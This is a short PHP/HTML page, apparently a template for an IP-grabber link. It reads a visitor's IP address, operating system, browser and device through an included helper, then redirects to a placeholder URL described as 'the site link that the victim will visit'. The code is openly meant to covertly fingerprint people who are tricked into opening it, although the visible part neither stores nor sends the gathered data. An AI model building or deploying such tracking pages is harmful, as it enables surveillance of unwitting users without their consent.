<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<?php 
include('user_info.php');
$ip = UserInfo::get_ip();
$os = UserInfo::get_os();
$browser = UserInfo::get_browser();
$device = UserInfo::get_device();
if(isset($ip)){ 
header("Location: https://www.here the site link that the victim will visit.com"); 
}
/*
*/
?>
<body>
</body>
</html>
